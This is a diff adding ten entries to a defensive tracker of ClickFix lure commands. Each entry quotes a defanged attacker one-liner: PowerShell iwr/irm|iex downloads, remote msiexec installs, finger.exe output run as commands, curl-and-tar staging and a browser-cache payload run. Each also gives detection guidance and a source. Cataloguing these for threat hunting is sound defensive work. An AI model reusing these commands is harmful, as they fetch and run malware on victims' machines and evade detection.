@@ -7,8 +7,8 @@ ClickFix is a social-engineering technique where a victim is tricked (fake CAPTC
 check, browser or document "error") into pasting and running an attacker-supplied command in the
 Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.
 
-- **Entries:** 42
-- **Last updated:** 2026-11-19
+- **Entries:** 52
+- **Last updated:** 2026-11-22
 - **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)
 
 ## Commands
@@ -57,6 +57,16 @@ Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user
 | cf-0040 | `powershell.exe -> WMI (WmiPrvSE.exe) -> cmd.exe -> rundll32.exe` | PowerShell starts a hidden cmd through WMI Win32_Process.Create, which breaks the explorer->cmd parent chain; cmd then mounts a WebDAV share over SSL and runs a DLL named 'gc.key' by ordinal #1 | CyberProof |
 | cf-0041 | `pcalua.exe -> powershell.exe -> cmd.exe -> rundll32.exe` | Program Compatibility Assistant proxies PowerShell, which uses Start-Process (saps) to launch cmd; carets split 'pushd' and 'rundll32', and a DLL disguised as 'j.pm' runs from WebDAV by ordinal | CyberProof |
 | cf-0042 | `cmd.exe` | Delayed-expansion variables rebuild 'pushd' and 'rundll32', and a for-loop runs the pushd to a WebDAV share over SSL on port 443; rundll32 then loads 'goog.ct' by ordinal #1 | CyberProof |
+| cf-0043 | `cmd.exe` | Cache-stashed payload: the lure page pre-fetches a script into the browser HTTP cache, then the pasted command walks the cache dir for an orphan f_* file matching an exact byte size and renames/runs it as a .bat — zero network egress at execution time. Chrome (\Google\Chrome\User Data) and Brave (\BraveSoftware\Brave-Browser\User Data) variants use the same shape. | Huntress |
+| cf-0044 | `powershell.exe` | StrikeStub: compromised site (spiraldirect.ch) serves a 'Verification Step' prompt that clipboards a hidden-window iwr download of a Cloudflare-branded EXE into %TEMP% as svc.exe, then launches it; stage two is a modular PowerShell RAT. | Akamai Security Intelligence Group (Larry Cashdollar) |
+| cf-0045 | `powershell.exe` | GzipGnaw cluster: minimal schemeless irm|iex one-liner served from DGA-style third-level hosts under a rotating registered domain, with the command string itself fetched from an on-chain (EtherHiding) contract so the lure page holds no payload URL. | ohey.ca (Matt Kirkland) |
+| cf-0046 | `powershell.exe` | TokenTooth cluster: bare-IP C2 with a fake 'CloudFlare_Captcha_ID' query-string token that doubles as a per-victim tracker and server-side gate; note the deliberately unbalanced parenthesis, which still executes. | ohey.ca (Matt Kirkland) |
+| cf-0047 | `msiexec.exe` | SkinFrame cluster: remote MSI install over a backslash-style URL, with a long bogus S1= property used as padding so the real command scrolls out of view in the Run dialog; lure page uses Cyrillic homoglyphs to defeat string matching. | ohey.ca (Matt Kirkland) |
+| cf-0048 | `cmd.exe (finger.exe)` | FrameFinger cluster: triple-nested %COMSPEC% with a minimized window; finger.exe is never named directly but resolved via 'where' with a wildcard mask, and its TCP/79 response is executed line-by-line as commands with no disk write. | ohey.ca (Matt Kirkland) |
+| cf-0049 | `cmd.exe / pcalua.exe (curl.exe)` | LenAI cluster: builds a dropper .cmd in %PUBLIC% line-by-line via echo redirection, copies curl.exe to x1.exe (referenced as 'c?rl.exe' to dodge string matching), downloads a.cmd, runs it, self-deletes, and launches the whole thing through pcalua.exe to break process lineage. | ohey.ca (Matt Kirkland) |
+| cf-0050 | `forfiles.exe` | forfiles.exe used as an execution proxy: it iterates a benign mask (notepad.exe) purely so its /c clause can spawn a cmd that reassembles 'powershell' from delayed-expansion variable fragments before an iex(irm) fetch. | blueteam.cool (Luke Wilkinson) |
+| cf-0051 | `curl.exe / tar.exe` | Two-LOLBin staging with no interpreter in the pasted line: curl pulls an archive mislabelled as .pdf into a per-victim %LOCALAPPDATA% folder (--create-dirs), then native tar.exe unpacks the real toolchain there. | blueteam.cool (Luke Wilkinson) |
+| cf-0052 | `powershell.exe` | IClickFix framework (mass-compromised WordPress sites): downloads a .json-disguised PowerShell script into a single-letter ProgramData subfolder, then re-launches a second hidden PowerShell with -ep Bypass -f to run it; delivers NetSupport RAT. | Sekoia Threat Detection & Research |
 
 ### cf-0001 — `powershell.exe`
 
@@ -519,6 +529,116 @@ cmd /v:on /c "set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x
 - **Detection:** Look for cmd.exe with '/v:on', short 'set' fragments like 'pu'/'shd'/'dll32', a 'for %x in (!' construct, and '@SSL@443' in one command line
 - **Source:** CyberProof — https://www.cyberproof.com/blog/clickfix-keeps-evolving-rundll32-ordinal-execution-over-webdav/
 - **Added:** 2026-07-28
+
+### cf-0043 — `cmd.exe`
+
+```text
+cmd /c for /r "%LOCALAPPDATA%\Mozilla\Firefox\Profiles" %f in (f_*) do @if %~zif==17635 copy "%f" %TEMP%\t.bat >nul 2>nul&%TEMP%\t.bat
+```
+
+- **Technique:** Cache-stashed payload: the lure page pre-fetches a script into the browser HTTP cache, then the pasted command walks the cache dir for an orphan f_* file matching an exact byte size and renames/runs it as a .bat — zero network egress at execution time. Chrome (\Google\Chrome\User Data) and Brave (\BraveSoftware\Brave-Browser\User Data) variants use the same shape.
+- **Detection:** Alert on cmd.exe with 'for /r' plus a browser cache path and the 'f_*' mask, or any copy of a file from a Cache_Data directory into %TEMP% with a .bat/.cmd extension; correlate with RunMRU write and explorer.exe parent.
+- **Source:** Huntress — https://www.huntress.com/blog/the-evolving-tradecraft-of-clickfix
+- **Added:** 2026-11-10
+
+### cf-0044 — `powershell.exe`
+
+```text
+powershell -w hidden -c "iwr 'hxxp://squidscript[.]com/Cloudflare[.]exe' -OutFile \"$env:TEMP\\svc.exe\";Start-Process \"$env:TEMP\\svc.exe\""
+```
+
+- **Technique:** StrikeStub: compromised site (spiraldirect.ch) serves a 'Verification Step' prompt that clipboards a hidden-window iwr download of a Cloudflare-branded EXE into %TEMP% as svc.exe, then launches it; stage two is a modular PowerShell RAT.
+- **Detection:** Hunt powershell.exe with '-w hidden' + Invoke-WebRequest/iwr writing -OutFile into $env:TEMP followed by Start-Process of the same path in one command line; flag masquerading filenames (svc.exe, Cloudflare.exe) executing from %TEMP%.
+- **Source:** Akamai Security Intelligence Group (Larry Cashdollar) — https://www.akamai.com/blog/security-research/2026/nov/strikestub-clickfix-powershell-malware-modular-rat
+- **Added:** 2026-11-12
+
+### cf-0045 — `powershell.exe`
+
+```text
+irm 'fmjjchoiowdel[.]xzx1[.]com/s/w/1' | iex
+```
+
+- **Technique:** GzipGnaw cluster: minimal schemeless irm|iex one-liner served from DGA-style third-level hosts under a rotating registered domain, with the command string itself fetched from an on-chain (EtherHiding) contract so the lure page holds no payload URL.
+- **Detection:** Flag Invoke-RestMethod/irm piped to iex where the URI has no http(s):// scheme (PowerShell infers it) — a strong anomaly signal; pair with EID 4104 script-block logs and RunMRU entries containing 'irm'.
+- **Source:** ohey.ca (Matt Kirkland) — https://ohey.ca/research/clickfix-blockchain-contract-to-pasted-command/
+- **Added:** 2026-11-16
+
+### cf-0046 — `powershell.exe`
+
+```text
+powershell -c "iex(irm '85[.]239[.]149[.]40?CloudFlare_Captcha_ID_7716254T1'"
+```
+
+- **Technique:** TokenTooth cluster: bare-IP C2 with a fake 'CloudFlare_Captcha_ID' query-string token that doubles as a per-victim tracker and server-side gate; note the deliberately unbalanced parenthesis, which still executes.
+- **Detection:** Hunt PowerShell command lines containing a bare IPv4 literal followed by '?' query text, especially strings like 'Captcha_ID', 'CloudFlare', or 'Ray_ID'; these never appear in legitimate admin one-liners.
+- **Source:** ohey.ca (Matt Kirkland) — https://ohey.ca/research/clickfix-blockchain-contract-to-pasted-command/
+- **Added:** 2026-11-16
+
+### cf-0047 — `msiexec.exe`
+
+```text
+msiexec.exe /i hxxp:\\cf-www[.]com\k3kwfghbu2fro1 /Q S1="Device Setup Host 10.0.19041 ready      To  verify  push  the  ENTER  key"
+```
+
+- **Technique:** SkinFrame cluster: remote MSI install over a backslash-style URL, with a long bogus S1= property used as padding so the real command scrolls out of view in the Run dialog; lure page uses Cyrillic homoglyphs to defeat string matching.
+- **Detection:** Alert on msiexec.exe with /i pointing at a remote URL plus unknown MSI PROPERTY=value pairs containing whitespace-padded instructional text ('push the ENTER key'); also flag msiexec URLs written with backslashes instead of forward slashes.
+- **Source:** ohey.ca (Matt Kirkland) — https://ohey.ca/research/clickfix-blockchain-contract-to-pasted-command/
+- **Added:** 2026-11-16
+
+### cf-0048 — `cmd.exe (finger.exe)`
+
+```text
+%COMSPEC% /c %COMSPEC% /c %COMSPEC% /c start "" /^min for /f "delims=" %u in ('where ,f*n*er,') do for /f "delims=" %w in ('"%u" peufghXXDh@dns-api[.]org') do @%w
+```
+
+- **Technique:** FrameFinger cluster: triple-nested %COMSPEC% with a minimized window; finger.exe is never named directly but resolved via 'where' with a wildcard mask, and its TCP/79 response is executed line-by-line as commands with no disk write.
+- **Detection:** Hunt outbound TCP/79 from any workstation (almost always malicious), and cmd.exe command lines containing 'where' with a comma-wrapped wildcard token or nested for /f loops where the inner loop executes '%w' directly.
+- **Source:** ohey.ca (Matt Kirkland) — https://ohey.ca/research/clickfix-blockchain-contract-to-pasted-command/
+- **Added:** 2026-11-16
+
+### cf-0049 — `cmd.exe / pcalua.exe (curl.exe)`
+
+```text
+cmd /c "(echo cd /d %~dp0&echo copy /b /y %windir%\system32\c?rl.exe x1.exe&echo .\x1.exe -sLoa.cmd hxxps://efreitorher[.]org/h/c/f9e1881c658d8b72&echo .\a.cmd&echo del a.cmd x1.exe)>%PUBLIC%\t.cmd& pcalua -a %PUBLIC%\t.cmd&rem reCaptcha ID: 255901"
+```
+
+- **Technique:** LenAI cluster: builds a dropper .cmd in %PUBLIC% line-by-line via echo redirection, copies curl.exe to x1.exe (referenced as 'c?rl.exe' to dodge string matching), downloads a.cmd, runs it, self-deletes, and launches the whole thing through pcalua.exe to break process lineage.
+- **Detection:** Hunt for copies of %windir%\system32\curl.exe to a renamed binary, echo-built .cmd files written to %PUBLIC%, pcalua.exe -a with a user-writable script path, and 'rem reCaptcha ID' / 'rem ' trailer comments in RunMRU.
+- **Source:** ohey.ca (Matt Kirkland) — https://ohey.ca/research/clickfix-blockchain-contract-to-pasted-command/
+- **Added:** 2026-11-16
+
+### cf-0050 — `forfiles.exe`
+
+```text
+forfiles.exe /p C:\Windows\System32 /m notepad.exe /c "cmd /v:on /c set p=pow&set e=ershe&set l=ll&!p!!e!!l! -WI 1 -nop -c iex(irm hxxps://<domain>/<path>)"
+```
+
+- **Technique:** forfiles.exe used as an execution proxy: it iterates a benign mask (notepad.exe) purely so its /c clause can spawn a cmd that reassembles 'powershell' from delayed-expansion variable fragments before an iex(irm) fetch.
+- **Detection:** Any forfiles.exe with a /c clause containing cmd/powershell is anomalous — alert on it outright; also flag 'set' fragments reassembled via !var! delayed expansion into an interpreter name.
+- **Source:** blueteam.cool (Luke Wilkinson) — https://blueteam.cool/posts/clickfix-2026-stage0/
+- **Added:** 2026-08-01
+
+### cf-0051 — `curl.exe / tar.exe`
+
+```text
+curl.exe -skSL --compressed --create-dirs -o "%LOCALAPPDATA%\<id>\<id>.pdf" hxxps://<domain>/<path> & tar.exe -xf "%LOCALAPPDATA%\<id>\<id>.pdf" -C "%LOCALAPPDATA%\<id>"
+```
+
+- **Technique:** Two-LOLBin staging with no interpreter in the pasted line: curl pulls an archive mislabelled as .pdf into a per-victim %LOCALAPPDATA% folder (--create-dirs), then native tar.exe unpacks the real toolchain there.
+- **Detection:** Hunt curl.exe with -k/--insecure and --create-dirs writing under %LOCALAPPDATA%, immediately followed by tar.exe -xf on a non-archive extension (.pdf/.png/.txt); parent explorer.exe makes it high-confidence ClickFix.
+- **Source:** blueteam.cool (Luke Wilkinson) — https://blueteam.cool/posts/clickfix-2026-stage0/
+- **Added:** 2026-08-01
+
+### cf-0052 — `powershell.exe`
+
+```text
+powershell -w hidden -nop -c "$v='8db6.ps1';$q=Join-Path $env:ProgramData 'e';$p=Join-Path $q $v;md $q -ea 0|out-null;iwr 'hxxps://scottvmorton[.]com/tytuy.json' -OutFile $p;cmd /c start powershell -w hidden -ep Bypass -f $p"
+```
+
+- **Technique:** IClickFix framework (mass-compromised WordPress sites): downloads a .json-disguised PowerShell script into a single-letter ProgramData subfolder, then re-launches a second hidden PowerShell with -ep Bypass -f to run it; delivers NetSupport RAT.
+- **Detection:** Flag Join-Path against $env:ProgramData with a 1-2 char directory, iwr saving a .json/.txt URL to a .ps1 path, and any powershell.exe spawning a second powershell.exe with '-ep Bypass -f' pointing into ProgramData.
+- **Source:** Sekoia Threat Detection & Research — https://www.sekoia.com/blog/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic
+- **Added:** 2026-01-29
 
 ## Threat Hunting (KQL — Microsoft Defender XDR)
 
